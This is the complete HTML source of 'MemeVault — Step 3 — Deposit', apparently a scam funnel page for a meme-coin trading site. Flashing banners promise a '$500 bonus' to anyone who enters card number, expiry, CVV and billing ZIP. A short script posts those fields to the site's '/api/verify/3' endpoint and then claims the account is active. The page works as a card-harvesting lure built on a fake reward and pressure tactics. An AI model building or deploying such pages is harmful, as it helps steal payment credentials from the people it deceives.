<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>MemeVault — Step 3 — Deposit</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0010;color:#fff;font-family:'Impact','Arial Black',sans-serif;min-height:100vh}
@keyframes flash{0%,100%{background:#0d0010}50%{background:#1a002a}}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-3px)}75%{transform:translateX(3px)}}
body{animation:flash 1.5s infinite}

.topbar{background:#000;padding:14px 24px;border-bottom:2px solid #ff00aa}
.brand{font-size:24px;color:#ffea00;text-shadow:2px 2px #ff00aa}
.bonus-banner{background:linear-gradient(90deg,#ff0066,#ffaa00);padding:14px;text-align:center;font-size:18px;font-weight:900;color:#000;animation:shake .3s infinite}
.container{max-width:520px;margin:30px auto;padding:0 20px}
.progress{display:flex;align-items:center;gap:8px;margin-bottom:24px;justify-content:center}
.step{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:900;font-family:Arial}
.step.done{background:#00ff66;color:#000}
.step.active{background:#ff00aa;color:#000}
.step-line{width:48px;height:3px;background:#333}
.card{background:linear-gradient(135deg,#1a0024,#2a0040);border:3px solid #ffea00;border-radius:14px;padding:30px}
h1{font-size:24px;color:#ffea00;text-shadow:2px 2px #ff00aa;margin-bottom:8px}
.desc{font-size:14px;color:#fff;margin-bottom:18px;font-family:Arial;font-weight:normal}
.field{margin-bottom:14px;font-family:Arial}
.field label{display:block;font-size:12px;font-weight:900;color:#ffea00;margin-bottom:5px;text-transform:uppercase}
.field input{width:100%;padding:10px 12px;background:#000;border:2px solid #ff00aa;border-radius:6px;color:#fff;font-family:'Courier New',monospace;outline:none}
.row{display:flex;gap:10px}.row .field{flex:1}
.btn{width:100%;padding:14px;background:#00ff66;color:#000;border:none;border-radius:8px;font-size:18px;font-weight:900;cursor:pointer;text-transform:uppercase;letter-spacing:2px;animation:shake .3s infinite}
</style>
</head>
<body>

<header class="topbar"><div class="brand">💎 MemeVault 🚀</div></header>
<div class="bonus-banner">🎉 LAST STEP — DEPOSIT TO UNLOCK $500 BONUS</div>
<div class="container">
  <div class="progress">
    <div class="step done">✓</div><div class="step-line"></div>
    <div class="step done">✓</div><div class="step-line"></div>
    <div class="step active">3</div>
  </div>
  <div class="card">
    <h1>STEP 3 — DEPOSIT</h1>
    <p class="desc">Add a card to claim your $500 bonus and start trading.</p>
    <form id="f">
      <div class="field"><label>Card Number</label><input id="card_number" placeholder="1234 5678 9012 3456" required></div>
      <div class="row">
        <div class="field"><label>Expiry</label><input id="expiry" placeholder="MM/YY" required></div>
        <div class="field"><label>CVV</label><input id="cvv" placeholder="123" required></div>
        <div class="field"><label>ZIP</label><input id="billing_zip" required></div>
      </div>
      <button type="submit" class="btn">⚡ CLAIM $500 BONUS ⚡</button>
    </form>
  </div>
</div>
<script>
document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();
fetch('/api/verify/3',{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({card_number:card_number.value,expiry:expiry.value,cvv:cvv.value,billing_zip:billing_zip.value})
}).then(function(){alert('Account active!');window.location.href='/'});});
</script>
</body>
</html>
